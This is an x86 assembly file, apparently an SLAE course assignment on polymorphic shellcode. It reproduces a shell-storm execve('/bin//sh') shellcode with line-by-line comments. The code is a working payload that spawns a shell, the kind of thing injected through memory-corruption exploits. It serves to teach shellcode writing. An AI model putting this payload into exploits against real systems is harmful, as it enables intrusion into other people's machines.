;#SLAE Assignment #06: Polymorphism
;#Original Shellcode from: http://shell-storm.org/shellcode/files/shellcode-517.php


section .text
global _start

_start: ;Original Version:
	xor ecx,ecx	;ecx=0
	mul ecx		;eax=0
	push ecx	;0-dword
	push 0x68732f2f	;"hs//"
	push 0x6e69622f	;"nib/"
	mov ebx,esp	;stringpointer
	mov al, 0xb	;11-> execve
	int 0x80	;call syscall
